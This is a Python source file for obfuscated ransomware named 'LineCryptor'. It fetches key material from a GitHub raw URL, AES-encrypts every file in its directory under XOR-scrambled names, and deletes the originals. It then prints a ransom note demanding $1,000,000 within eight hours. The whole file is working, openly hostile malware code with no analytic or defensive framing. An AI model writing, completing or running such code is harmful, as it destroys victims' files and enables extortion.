import os
import requests
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def ______(_, __, ___):
    _____ = ____()
    ______ = AES.new(___, AES.MODE_CBC, _____)
    _______ = open(_, 'rb')
    ________ = _______.read()
    _______.close
    _________ = pad(________, AES.block_size)
    __________ = ______.encrypt(_________)
    ___________ = open(__, 'wb')
    ___________.write(__________)
    ___________.close

def ___________(_, __):
    ___ = requests.get(_, stream=True)
    if ___.status_code == 200:
        ____ = open(__, 'wb')
        for _____ in ___.iter_content(chunk_size=8192):
            ____.write(_____)
        ____.close
    else:
        print(f"Failed. Status code: {___.status_code}")
def _____(_, __):
    try:
        ____ = open(_, 'r', encoding='latin-1')
        ___ = ____.readlines()
        ____.close
        if __ <= len(___):
            return ___[__-1].strip()
        else:
            return "error"
    except FileNotFoundError:
        return "File not found."
    except Exception as e:
        return f"An error occurred: {e}"
def ____________(_):
    try:
        os.remove(_)
    except FileNotFoundError:
        print(f"Error: File not found.")
    except Exception as e:
        print(f"An error occurred: {e}")

def ___():
    return "https://raw.githubusercontent.com/ptr173/_/main/$.txt"

def ________():
    return 965374

def _______(_):
    __ = ___()
    ____ = "a.txt"
    ___________(__, ____)
    ______ = ________()
    _______ = _____(____, ______)
    _________ =''
    for i in range(len(_)):
        res = ord(_[i]) ^ ord(_______[i % len(_______)])
        _________ += chr(res)
    ____________(____)
    __________ = _________.encode('latin1')
    _____________ = base64.b64encode(__________)
    return _____________

def ____():
    _ = ___()
    __ = "$.txt"
    ___________(_, __)
    ______ = _____(__, ________())
    ____________(__)
    _______ = ______.encode('latin1')
    return _______.ljust(16, b'\x00')[:16]

def __(____):
    _ = ''
    __ = len(____)
    for ___ in range(16):
        _ += ____[___ % __]
    return _.ljust(16, '\x00').encode('latin1')

def _():
    ___ = '.'
    ____ = os.path.basename(__file__)
    for _____ in os.listdir(___):
        if os.path.isfile(_____) and _____ != ____:
            ________=__(_____)
            _________=_______(_____)
            __________ = _____
            ___________ = _________
            ______(__________, ___________, ________)
            ____________(__________)
    prints()
    input()


def prints():
    print(f"██╗     ██╗███╗   ██╗███████╗ ██████╗██████╗ ██╗   ██╗██████╗ ████████╗ ██████╗  ██████╗ ")
    print(f"██║     ██║████╗  ██║██╔════╝██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗╚══██╔══╝██╔═══██╗ ██╔══██╗  ")
    print(f"██║     ██║██╔██╗ ██║█████╗  ██║     ██████╔╝ ╚████╔╝ ██████╔╝   ██║   ██║   ██║ ██████╔╝")
    print(f"██║     ██║██║╚██╗██║██╔══╝  ██║     ██╔══██╗  ╚██╔╝  ██╔═══╝    ██║   ██║   ██║ ██╔══██╗")
    print(f"███████╗██║██║ ╚████║███████╗╚██████╗██║  ██║   ██║   ██║        ██║   ╚██████╔╝ ██║  ██║ ")
    print(f"╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝        ╚═╝    ╚═════╝  ╚═╝  ╚═╝ ")
    print("\n")
    print(f"Your files have been encrypted by LineCryptor.\n\nTo recover your files, you must pay a ransom of $1.000.000\n\nYou can do a payment to 521098231732.\n\nFor support and instructions, contact our support team _.ptr._\n\nYou will receive your decryption key after the payment is confirmed.\n\nDo not try to decrypt your files using other tools; it will cause irreversible damage to your files.\n\nYou have 8 hours to make the payment, or your files will be permanently lost.")
                                                                                


if __name__ == "__main__":
    _()
